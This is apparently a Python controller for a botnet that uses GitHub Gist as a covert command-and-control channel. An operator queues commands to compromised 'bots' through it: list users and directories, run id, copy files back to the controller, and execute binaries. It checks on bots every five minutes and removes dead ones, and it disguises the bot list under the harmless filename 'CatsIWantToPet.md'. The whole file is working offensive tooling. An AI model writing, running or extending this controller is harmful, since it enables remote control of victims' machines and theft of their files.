import os
import sys
import time
import gist, ping
import ls_bots
from threading import Thread
from timeit import default_timer as timer


def reader():
    print("Waiting for input (type help for help 🙃)")

    while True:
        read = sys.stdin.readline()
        cmd = read.split()
        if len(cmd) == 0: continue
        if cmd[0] == "ls_bots":
            print("LS_BOTS added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["ls_bots"])
        elif cmd[0] == "w":
            if len(cmd) <= 1:
                print("Not enough parameters", file=sys.stderr)
                continue
            print("W added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["w", cmd[1]])
        elif cmd[0] == "ls":
            if len(cmd) <= 2:
                print("Not enough parameters", file=sys.stderr)
                continue
            print("LS added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["ls", cmd[1], cmd[2]])
        elif cmd[0] == "id":
            if len(cmd) <= 1:
                print("Not enough parameters", file=sys.stderr)
                continue
            print("ID added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["id", cmd[1]])
        elif cmd[0] == "cp":
            if len(cmd) <= 2:
                print("Not enough parameters", file=sys.stderr)
                continue
            print("CP added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["cp", cmd[1], cmd[2]])
        elif cmd[0] == "exec":
            if len(cmd) <= 2:
                print("Not enough parameters", file=sys.stderr)
                continue
            print("EXEC added to execute list", file=sys.stderr)
            EXECUTE_CMDS.append(["exec", cmd[1], cmd[2]])
        elif cmd[0] == "exit":
            EXECUTE_CMDS.append(["exit"])
            return
        elif cmd[0] == "ping":
            EXECUTE_CMDS.append(["ping"])
        elif cmd[0] == "todo":
            if len(EXECUTE_CMDS) == 0:
                print("NO COMMANDS IN QUEUE", file=sys.stderr, flush=True)
            else:
                out = "----- COMMANDS TO BE EXECUTED -----\n"
                for array in EXECUTE_CMDS:
                    for cmd in array:
                        out += cmd + " "
                    out += "\n"
                out += "-----------------------------------\n"
                print(out, file=sys.stderr, flush=True)
        else:
            print("usage: <command name> [bot name] [parameter1 ...]\n\n"
                  "\tls_bots \t\t\t(lists all currently available bots)\n"
                  "\ttodo  \t\t\t\t(list all the queued commands)\n"
                  "\texit  \t\t\t\t(stop controller)\n"
                  "\tping  \t\t\t\t(ping all bots manually)\n"
                  "\tw  <bot filename> \t\t(lists users currently logged in)\n"
                  "\tls <bot filename> <PATH> \t(list content of specified directory using ls -la)\n"
                  "\tid <bot filename> \t\t(id of current user)\n"
                  "\tcp <bot filename> <PATH> \t(copy fole from the bot to controller)\n"
                  "\texec <bot filename> <PATH> \t(execute a binary inside the bot given the name of the binary)\n")


def executor():
    start = timer()
    ping_ = False
    while True:
        if len(EXECUTE_CMDS) == 0:
            time.sleep(1)
        else:
            cmd = EXECUTE_CMDS.pop(0)
            if cmd[0] == "ls_bots":
                print("ls_bots executing", file=sys.stderr)
                ls_bots.list_current_bots(GIST_API, BOT_LIST)

            elif cmd[0] == "w":
                print("w executing", file=sys.stderr)
                if gist.send_command(GIST_API,  "w", cmd[1]):
                    if gist.check_response(GIST_API, cmd[1]):
                        gist.print_response(GIST_API, cmd[1])

            elif cmd[0] == "ls":
                print("ls {} executing".format(cmd[2]), file=sys.stderr)
                if gist.send_command(GIST_API, "ls", cmd[1], cmd[2]):
                    if gist.check_response(GIST_API, cmd[1]):
                        gist.print_response(GIST_API, cmd[1])

            elif cmd[0] == "id":
                print("id executing", file=sys.stderr)
                if gist.send_command(GIST_API, "id", cmd[1]):
                    if gist.check_response(GIST_API, cmd[1]):
                        gist.print_response(GIST_API, cmd[1])

            elif cmd[0] == "cp":
                print("cp {} executing".format(cmd[2]), file=sys.stderr)
                if gist.send_command(GIST_API, "cp", cmd[1], cmd[2]):
                    if gist.check_response(GIST_API, cmd[1], time_to_wait=60):
                        gist.save_file_response(GIST_API, cmd[1], cmd[2])
                        print("{} SUCCESSFULLY COPIED (see copies dir)".format(cmd[2]), file=sys.stderr)

            elif cmd[0] == "exec":
                print("exec {} executing".format(cmd[2]), file=sys.stderr)
                if gist.send_command(GIST_API, "exec", cmd[1], cmd[2]):
                    if gist.check_response(GIST_API, cmd[1]):
                        gist.print_response(GIST_API, cmd[1])

            elif cmd[0] == "ping":
                ping_ = True

            elif cmd[0] == "exit":
                print("BYE BYE - SEE YOU LATER")
                return

            else:
                print("Unknown command" + cmd[0])

        # Check if the bots are alive every 5 minutes
        if timer() - start > 300 or ping_:  # 300 s = 5 min
            # Reset bots
            response_time = 15
            print("----- CHECKING ALIVE BOTS -----", file=sys.stderr)
            ping.send(GIST_API, BOT_LIST)

            print("WAITING FOR BOTS TO RESPOND", file=sys.stderr, end="")
            for i in range(response_time, 0, -1):
                time.sleep(1)
                print(".", file=sys.stderr, end="", flush=True)

            # Check if bots are alive -> remove dead
            print("\nREMOVING DEAD BOTS", file=sys.stderr)
            ping.check(GIST_API, BOT_LIST)
            start = timer()
            ping_ = False
            print("----- BOT CHECK COMPLETE -----", file=sys.stderr)


# Prepare helper folder (tmp directory)
if not os.path.exists('tmp'):
    os.mkdir('tmp')

if not os.path.exists('copied'):
    os.mkdir('copied')

# Define parameters
EXECUTE_CMDS = []
BOT_LIST = "CatsIWantToPet.md"
GIST_API = gist.get_gist_api()

# Create init bot list on gist
gist.init_bot_list(GIST_API, BOT_LIST)

# Run threads for reading and executing
reader_thread = Thread(target=reader)
executor_thread = Thread(target=executor)
reader_thread.start()
executor_thread.start()

# Wait until exit
reader_thread.join()
executor_thread.join()

# Cleanup helper folder (tmp directory, copied if empty)
os.rmdir('tmp')
if len(os.listdir('copied')) == 0:
    os.rmdir('copied')
